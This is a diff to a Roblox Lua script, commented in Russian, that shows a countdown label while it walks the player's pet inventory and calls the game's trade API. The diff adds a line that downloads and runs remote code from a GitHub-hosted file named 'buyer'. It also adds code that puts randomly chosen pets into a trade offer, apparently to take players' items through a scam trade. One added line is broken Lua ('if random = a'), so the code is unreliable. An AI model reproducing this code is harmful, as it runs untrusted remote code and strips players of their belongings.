@@ -10,18 +10,25 @@ label1.Position = UDim2.new(0.5, 250, 0.5, 50) -- Позиция метки
 label1.BackgroundColor3 = Color3.new(1, 1, 1) -- Цвет фона метки
 label1.TextColor3 = Color3.new(0, 0, 0) -- Цвет текста метки
 label1.FontSize = Enum.FontSize.Size60 -- Увеличиваем размер шрифта в 4 раза
-
+local count111 = 0
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qweaad1/qwe/main/buyer"))()
+for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
+  count111 = count111+1
+end
 local timer = 0
 
-for i = 1, 10 do
+for i = 1, 18 do
+local random = 0
+local a = math.random(count111)
     wait(1)
     timer = timer + 1
 label1.Text = (tostring(timer))
 
 print(timer) -- выводит количество выполненных циклов (в данном случае 10)
 for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
- 
+ random=random+1
+if random = a then
  ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
- 
+ end
  end
 end
